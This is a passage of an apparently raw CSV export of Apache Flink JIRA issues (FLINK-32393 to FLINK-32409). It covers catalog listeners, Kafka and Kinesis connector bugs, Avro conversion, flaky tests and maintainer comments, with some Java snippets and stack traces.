We should introduce helper methods (similar to Guava's `Maps.newHashMapWithExpectedSize(int)`) for allocations for expected size and replace  the direct constructor calls with those.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jan 24 14:34:55 UTC 2024,,,,,,,,,,"0|z1ip3k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","24/Jan/24 14:31;mapohl;[~srichter] is this an ongoing effort? Looks like the PR made it into master and release-1.18 with [ab9445ac|https://github.com/apache/flink/commit/ab9445ac] and we could set the fixVersion to 1.18.0 and close this issue?

I just came across it when investigating some test instability in 1.18;;;","24/Jan/24 14:34;srichter;Yes, it's already done.;;;",,,,,,,,,,,,,,,,,,,,
Moves componentId/contenderID handling from DefaultMultipleComponentLeaderElectionService into DefaultLeaderElectionService,FLINK-32409,13540899,13432464,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,21/Jun/23 13:40,06/Jul/23 06:32,04/Jun/24 20:41,06/Jul/23 06:32,,,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 06 06:32:09 UTC 2023,,,,,,,,,,"0|z1ip2g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jul/23 06:32;mapohl;master: e35a236eb2403ae0e99e55b3533fd0b952b4db38;;;",,,,,,,,,,,,,,,,,,,,,,
JobManager HA configuration update needed in Flink k8s Operator ,FLINK-32408,13540894,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,,dongwoo.kim,dongwoo.kim,21/Jun/23 13:09,21/Jun/23 14:54,04/Jun/24 20:41,21/Jun/23 14:54,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,,,,"In flink 1.17 documentation it says, to configure job manger ha we have to configure *high-availability.type* key not *high-availability* key{*}.{*} (It seems to be changed from 1.17)

And currently kubernetes-operator-1.5.0 says it supports flink 1.17 version. 
So I expected that configuring job manager ha with *high-availability.type* should work but it didn't, only *high-availability* works

*ref*
[https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/deployment/config/#high-availability] 
[https://nightlies.apache.org/flink/flink-kubernetes-operator-docs-release-1.5/docs/concepts/overview/#core] ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 21 13:26:18 UTC 2023,,,,,,,,,,"0|z1ip1c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/Jun/23 13:20;dongwoo.kim;I think this is fixed in new version because in main branch's pom.xml, flink version is updated from *1.16.1* to *1.17.1.*
But then I'm curious whether we can say that kubernetes-operator-1.5.0 supports flink 1.17 version, since they had flink version configured to 1.16.1;;;","21/Jun/23 13:26;gyfora;If you are using Operator 1.5.0 with Flink 1.17.1 you need to use the old config key. But it will work;;;",,,,,,,,,,,,,,,,,,,,,
Notify catalog listener for table events,FLINK-32407,13540877,13540870,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,21/Jun/23 09:36,23/Jul/23 14:38,04/Jun/24 20:41,23/Jul/23 14:38,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 14:38:15 UTC 2023,,,,,,,,,,"0|z1ioxk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 14:38;renqs;Merged to master: 8f4409e717c0d9f820915214fb4e95f5c2d1fcd4;;;",,,,,,,,,,,,,,,,,,,,,,
Notify catalog listener for database events,FLINK-32406,13540876,13540870,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,21/Jun/23 09:35,21/Jul/23 16:47,04/Jun/24 20:41,21/Jul/23 16:47,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 21 16:47:18 UTC 2023,,,,,,,,,,"0|z1ioxc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/Jul/23 16:47;renqs;Merged to master: 151566d21e7051820182c13b78794669d8a5013c;;;",,,,,,,,,,,,,,,,,,,,,,
Initialize catalog listener for CatalogManager,FLINK-32405,13540875,13540870,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,fangyong,zjureel,zjureel,21/Jun/23 09:35,21/Sep/23 02:23,04/Jun/24 20:41,21/Sep/23 02:17,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32404,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Sep 21 02:23:05 UTC 2023,,,,,,,,,,"0|z1iox4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"20/Sep/23 02:43;libenchao;[~zjureel] I'm a bit of confused about the status of this issue, there seems no commit hash attached, and no corresponding PR. Is this issue fixed by other issue/PR? If so, we'd better add a link about that. If it's a invalid issue, we'd better mark the resolution as  ""Not a problem"". WDYT?;;;","21/Sep/23 02:16;zjureel;OK, it is a duplicate issue with FLINK-32404;;;","21/Sep/23 02:17;zjureel;Duplicate with FLINK-32404;;;","21/Sep/23 02:23;libenchao;[~zjureel] Thanks for the updating, I've also added the link.;;;",,,,,,,,,,,,,,,,,,,
Introduce catalog modification listener and factory interfaces,FLINK-32404,13540872,13540870,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fangyong,zjureel,zjureel,21/Jun/23 09:32,21/Sep/23 02:21,04/Jun/24 20:41,21/Jul/23 03:26,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,FLINK-32405,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 21 03:26:04 UTC 2023,,,,,,,,,,"0|z1iowg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/Jul/23 03:26;renqs;master: fd96076b1b41a50dc9e1eed0a2f8f676ccc44b54;;;",,,,,,,,,,,,,,,,,,,,,,
Add database related operations in catalog manager,FLINK-32403,13540871,13540870,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,21/Jun/23 09:26,21/Jul/23 03:25,04/Jun/24 20:41,21/Jul/23 03:25,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,Add database operations in catalog manager for different sql operations,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 21 03:25:25 UTC 2023,,,,,,,,,,"0|z1iow8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/Jul/23 03:25;renqs;master: d8e77674a885feba22dd079656e4b39f33fa5da1;;;",,,,,,,,,,,,,,,,,,,,,,
FLIP-294: Support Customized Catalog Modification Listener,FLINK-32402,13540870,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,21/Jun/23 09:19,27/Jul/23 02:35,04/Jun/24 20:41,23/Jul/23 14:38,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / Ecosystem,,,,0,,,,Issue for https://cwiki.apache.org/confluence/display/FLINK/FLIP-294%3A+Support+Customized+Catalog+Modification+Listener,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-31275,FLINK-32676,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 27 02:35:30 UTC 2023,,,,,,,,,,"0|z1iow0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Jul/23 11:50;knaufk;[~zjureel]Does this feature require any documentation for other implementers? How do people discover this feature? Thanks, Konstantin (one of the release managers for Flink 1.18);;;","26/Jul/23 02:20;zjureel;Thanks [~knaufk], I'll create an issue to add doc for this feature;;;","26/Jul/23 07:29;knaufk;[~zjureel] Great. There is a PR that adds documentation for the pluggable error classification under Deployment -> Advanced (https://nightlies.apache.org/flink/flink-docs-master/docs/deployment/advanced). Would this be a good place?;;;","27/Jul/23 02:35;zjureel;[~knaufk] Currently I think it's better to add this in `catalogs.md` and users can get all information about catalogs in that page, I noticed that some advanced usages of catalog are already in `cagalogs.md` such as `User-Defined Catalog`. What do you think?;;;",,,,,,,,,,,,,,,,,,,
KafkaSourceBuilder reset the 'auto.offset.reset',FLINK-32401,13540849,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,,kianchen,kianchen,21/Jun/23 06:57,28/Jun/23 12:56,04/Jun/24 20:41,28/Jun/23 12:56,1.14.0,1.15.0,1.16.0,1.17.0,1.18.0,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,,,,"KafkaSourceBuilde#parseAndSetRequiredProperties reset the 'auto.offset.reset' to ""earliest""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-21 06:57:29.0,,,,,,,,,,"0|z1iorc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KafkaSourceBuilder#maybeOverride get property as a string to checking if has value may not be the best way,FLINK-32400,13540833,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,kianchen,kianchen,21/Jun/23 01:44,28/Jun/23 12:56,04/Jun/24 20:41,,1.14.0,1.15.0,1.16.0,1.17.0,1.18.0,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,,,,"Since flink 1.14 the FlinkKafkaConsumer is deprecated, using KafkaSouce instead. As the summary, the KafkaSourceBuilder can be set properties through setProperties(Properties props) method. And the value of props can be an object (such as the ""enable.auto.commit"" can be boolean). The #maybeOverride method used Properties#getProperty (in this method if the value is not type of string then return null) to get the value and checking if it's null. KafkaSourceBuilder#build calls #parseAndSetRequiredProperties method and it checks the ""enable.auto.commit"" property. If the value is true which is type of boolean then it will be overridden by false. But the kafka-clients supports boolean type. the value only for checking and printing, so I think use Properties#get method to get the value as an object is better.

the source code as below:
{code:java}
private boolean maybeOverride(String key, String value, boolean override) {
    boolean overridden = false;
    String userValue = this.props.getProperty(key);
    if (userValue != null) {
        if (override) {
            LOG.warn(String.format(""Property %s is provided but will be overridden from %s to %s"", key, userValue, value));
            this.props.setProperty(key, value);
            overridden = true;
        }
    } else {
        this.props.setProperty(key, value);
    }

    return overridden;
} {code}
the improvement as below:
{code:java}
private boolean maybeOverride(String key, String value, boolean override) {
    boolean overridden = false;
    Object userValue = this.props.get(key);
    if (userValue != null) {
        if (override) {
            LOG.warn(String.format(""Property %s is provided but will be overridden from %s to %s"", key, userValue, value));
            props.setProperty(key, value);
            overridden = true;
        }
    } else {
        props.setProperty(key, value);
    }
    return overridden;
} {code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 12:56:14 UTC 2023,,,,,,,,,,"0|z1ions:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 12:56;martijnvisser;[~tzulitai] WDYT?;;;",,,,,,,,,,,,,,,,,,,,,,
Fix flink-sql-connector-kinesis build for maven 3.8.6+,FLINK-32399,13540808,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,a.pilipenko,a.pilipenko,a.pilipenko,20/Jun/23 20:48,12/Oct/23 17:20,04/Jun/24 20:41,12/Oct/23 14:03,aws-connector-3.0.0,aws-connector-4.0.0,aws-connector-4.1.0,,,,,,,,,,,,aws-connector-4.2.0,,,,,,Connectors / Kinesis,,,,0,pull-request-available,,,"Fix build for sql kinesis connector with maven versions 3.8.6 and above.

Currently, when using maven newer than 3.8.5, the resulting jar will contain dependencies of flink-connector-kinesis along with relocated versions of these dependencies.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Oct 12 17:20:53 UTC 2023,,,,,,,,,,"0|z1ioi8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Oct/23 14:03;hong;merged commit [{{66826b7}}|https://github.com/apache/flink-connector-aws/commit/66826b786dadf163dcca2279dc6b79c1a169521e] into apache:main [now|https://github.com/apache/flink-connector-aws/pull/87#event-10632082219];;;","12/Oct/23 14:08;martijnvisser;[~hong] So now AWS can use the same template as the other externalized connectors? :) Great work! ;;;","12/Oct/23 17:20;hong;Ah, that's a good call. We will need to make some tweaks because we recently added an AWS EndToEnd test step if the AWS creds are configured (test connectors against real AWS services)

But I've created a Jira for this! https://issues.apache.org/jira/browse/FLINK-33259;;;",,,,,,,,,,,,,,,,,,,,
Support Avro SpecificRecord in DataStream and Table conversion.,FLINK-32398,13540773,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,becket_qin,becket_qin,20/Jun/23 14:35,20/Jun/23 14:54,04/Jun/24 20:41,,1.17.1,,,,,,,,,,,,,,,,,,,,"Formats (JSON, Avro, Parquet, ORC, SequenceFile)",,,,0,,,,"At this point, it seems that Avro SpecificRecord is not supported in DataStream and Table conversion. For example, the following code breaks when MyAvroRecord contains fields of type Record, Enum, Array, etc.

 
{code:java}
ing schemaString = MyAvroRecord.getClassSchema().toString();
DataType dataType = AvroSchemaConverter.convertToDataType(schemaString);
TypeInformation<MyAvroRecord> typeInfo = AvroSchemaConverter.convertToTypeInfo(schemaString);;

input.getTransformation().setOutputType(typeInfo);
tEnv.createTemporaryView(""myTable"", input);
Table result = tEnv.sqlQuery(""SELECT * FROM myTable"");
DataStream<MyAvroRecord> output = tEnv.toDataStream(result, dataType);
output.getTransformation().setOutputType(typeInfo); {code}
 

While the conversion from {{MyAvroRecord}} to {{RowData}} seems fine, several issues were there when converting the {{RowData}} back to {{{}MyAvroRecord{}}}, including but not limited to:
 # {{AvroSchemaConverter.convertToDataType(schema)}} maps Avro Record type to RowType, which loses the class information.
 # {{AvroSchemaConverter}} maps Enum to StringType, and simply try to cast the string to the Enum.

I did not find a way to easily convert the between DataStream and Table for Avro SpecificRecord. Given the popularity of Avro SpecificRecord, we should support this.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 20 14:54:01 UTC 2023,,,,,,,,,,"0|z1ioag:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"20/Jun/23 14:54;becket_qin;[~twalthr] [~jark] If this already works and I missed something, please let me know.

Orthogonal to this ticket, the {{AvroSchemaConverter }}class is not marked as Public, but from the commit log it seems this should be a public API. Same issue is there for the other classes in the flink-avro package. Actually non of the classes / interfaces is marked as Public in the entire flink-avro package.;;;",,,,,,,,,,,,,,,,,,,,,,
Add doc for add/drop/show partition,FLINK-32397,13540745,13439556,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,ruanhang1993,luoyuxia,luoyuxia,20/Jun/23 11:47,20/Oct/23 09:34,04/Jun/24 20:41,07/Jul/23 01:26,,,,,,,,,,,,,,,,,,,,,Documentation,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Oct 20 09:27:51 UTC 2023,,,,,,,,,,"0|z1io48:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"20/Jun/23 12:17;ruanhang1993;I would like to help. Please assign this to me. Thanks.;;;","20/Jun/23 12:21;luoyuxia;[~ruanhang1993] Thanks for voluntering. ;;;","07/Jul/23 01:26;luoyuxia;master:

6074d7b1f4c41455365ba1423859bdd7385d123b;;;","20/Oct/23 07:20;twalthr;[~luoyuxia] sorry for the ping but I see this ALTER TABLE PARTITION thing for the first time.

Maybe we should have added a FLIP for it because syntax like was never agreed upon:
{code}
ALTER TABLE MyTable ADD PARTITION (p1=1,p2='a') with ('k1'='v1') PARTITION (p1=1,p2='b') with ('k2'='v2');
{code}

Anyway is there a comma missing in the docs?;;;","20/Oct/23 09:27;luoyuxia;[~twalthr] Hi, sorry for the confusion. But in FLINK-27237, we did intend to start a FLIP discuss for it, but it turned out it has been voted in FLIP-63 as the comments in FLINK-27237 said.

It's expected that the comma is missing as  the description in FLINK-27237 show.  We also have investigated some pupular engines for big data, they did no comma between partitions in {{alter table add partition}} statemetn.

Spark: [https://spark.apache.org/docs/latest/sql-ref-syntax-ddl-alter-table.html]

Hive: [https://github.com/apache/hive/blob/b02cef4fe943b9aba597dcdfd3b8f3d3a5efca3e/parser/src/java/org/apache/hadoop/hive/ql/parse/AlterClauseParser.g#L248]

aws: https://docs.aws.amazon.com/athena/latest/ug/alter-table-add-partition.html

So, I think the current behavior may be reasonable since it‘s compatible with known engines.

But in the doc of FLIP-63, it seems it did have a comma. I'd think may be a mistake in the doc of FLIP-63.

cc [~lsy] @[Jingsong Lee|https://cwiki.apache.org/confluence/display/~jingsonglee0];;;",,,,,,,,,,,,,,,,,,
Support timestamp for jdbc driver and gateway,FLINK-32396,13540744,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,zjureel,zjureel,zjureel,20/Jun/23 11:39,11/Sep/23 12:35,04/Jun/24 20:41,11/Sep/23 12:35,1.18.0,,,,,,,,,,,,,,1.19.0,,,,,,Table SQL / JDBC,,,,0,auto-deprioritized-major,pull-request-available,,Support timestamp and timestamp_ltz data type for jdbc driver and sql-gateway,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-31496,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Sep 11 12:35:30 UTC 2023,,,,,,,,,,"0|z1io40:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","08/Sep/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;","11/Sep/23 12:35;zjureel;Fixed by c33a6527d8383dc571e0b648b8a29322416ab9d6;;;",,,,,,,,,,,,,,,,,,,,
EmbeddedFileSourceCsvReaderFormatTests.test_csv_add_columns_from fails on AZP,FLINK-32395,13540737,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,Sergey Nuyanzin,Sergey Nuyanzin,20/Jun/23 10:29,27/Aug/23 22:35,04/Jun/24 20:41,,1.16.3,,,,,,,,,,,,,,,,,,,,API / Python,,,,0,auto-deprioritized-major,test-stability,,"This build fails https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50218&view=logs&j=3e4dd1a2-fe2f-5e5d-a581-48087e718d53&t=b4612f28-e3b5-5853-8a8b-610ae894217a&l=39609
{noformat}
Jun 20 03:09:48 =================================== FAILURES ===================================
Jun 20 03:09:48 _______ EmbeddedFileSourceCsvReaderFormatTests.test_csv_add_columns_from _______
Jun 20 03:09:48 
Jun 20 03:09:48 self = <pyflink.datastream.formats.tests.test_csv.EmbeddedFileSourceCsvReaderFormatTests testMethod=test_csv_add_columns_from>
Jun 20 03:09:48 
Jun 20 03:09:48     def test_csv_add_columns_from(self):
Jun 20 03:09:48         original_schema, lines = _create_csv_primitive_column_schema_and_lines()
Jun 20 03:09:48         schema = CsvSchema.builder().add_columns_from(original_schema).build()
Jun 20 03:09:48         self._build_csv_job(schema, lines)
Jun 20 03:09:48     
Jun 20 03:09:48 >       self.env.execute('test_csv_schema_copy')
Jun 20 03:09:48 
Jun 20 03:09:48 pyflink/datastream/formats/tests/test_csv.py:56: 
...
{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Aug 27 22:35:10 UTC 2023,,,,,,,,,,"0|z1io2g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","27/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
Init.pos is partially stored in connector state,FLINK-32394,13540736,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,usamj,usamj,20/Jun/23 10:21,15/Dec/23 10:54,04/Jun/24 20:41,,1.17.1,,,,,,,,,,,,,,,,,,,,Connectors / Kinesis,,,,0,,,,"The Init.pos is partially stored in connector state which can lead to inconsistencies further down the line in idle streams. In particularly an issue arises when the init.pos is AT_TIMESTAMP, and the init.pos is later changed to TRIM_HORIZON.

The issue is that AT_TIMESTAMP is stored in the connector state but the timestamp itself isn't stored in the state. If a stream is idle and the init.pos is changed to TRIM_HORIZON then the connector attempts to read from AT_TIMSTAMP (due to it being stored in state) attempting to get the timestamp from the properties however it is no longer there as the init.pos property is not TRIM_HORIZON.

Sample error

 
{code:java}
java.lang.IllegalArgumentException: java.lang.NullPointerException
    at org.apache.flink.streaming.connectors.kinesis.util.KinesisConfigUtil.parseStreamTimestampStartingPosition(KinesisConfigUtil.java:579)
    at org.apache.flink.streaming.connectors.kinesis.util.AWSUtil.getStartingPosition(AWSUtil.java:325)
    at org.apache.flink.streaming.connectors.kinesis.internals.KinesisDataFetcher.createRecordPublisher(KinesisDataFetcher.java:495)
    at org.apache.flink.streaming.connectors.kinesis.internals.KinesisDataFetcher.createShardConsumer(KinesisDataFetcher.java:465)
    at org.apache.flink.streaming.connectors.kinesis.internals.KinesisDataFetcher.runFetcher(KinesisDataFetcher.java:592)
    at org.apache.flink.streaming.connectors.kinesis.FlinkKinesisConsumer.run(FlinkKinesisConsumer.java:392)
    at org.apache.flink.streaming.api.operators.StreamSource.run(StreamSource.java:110)
    at org.apache.flink.streaming.api.operators.StreamSource.run(StreamSource.java:66)
    at org.apache.flink.streaming.runtime.tasks.SourceStreamTask$LegacySourceFunctionThread.run(SourceStreamTask.java:269)
Caused by: java.lang.NullPointerException
    at java.base/java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1470)
    at java.base/java.text.DateFormat.parse(DateFormat.java:393)
    at org.apache.flink.streaming.connectors.kinesis.util.KinesisConfigUtil.parseStreamTimestampStartingPosition(KinesisConfigUtil.java:577)
    ... 8 more

{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-20 10:21:52.0,,,,,,,,,,"0|z1io28:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NettyClientServerSslTest.testSslPinningForInvalidFingerprint fails with Address already in use,FLINK-32393,13540733,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Sergey Nuyanzin,Sergey Nuyanzin,20/Jun/23 10:03,18/Aug/23 22:35,04/Jun/24 20:41,,1.17.2,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,auto-deprioritized-critical,test-stability,,"This build https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50162&view=logs&j=77a9d8e1-d610-59b3-fc2a-4766541e0e33&t=125e07e7-8de0-5c6c-a541-a567415af3ef&l=7794
fails with
{noformat}
Jun 19 05:40:33 [ERROR] Tests run: 14, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 10.095 s <<< FAILURE! - in org.apache.flink.runtime.io.network.netty.NettyClientServerSslTest
Jun 19 05:40:33 [ERROR] NettyClientServerSslTest.testSslPinningForInvalidFingerprint  Time elapsed: 1.236 s  <<< ERROR!
Jun 19 05:40:33 org.apache.flink.shaded.netty4.io.netty.channel.unix.Errors$NativeIoException: bind(..) failed: Address already in use
Jun 19 05:40:33 

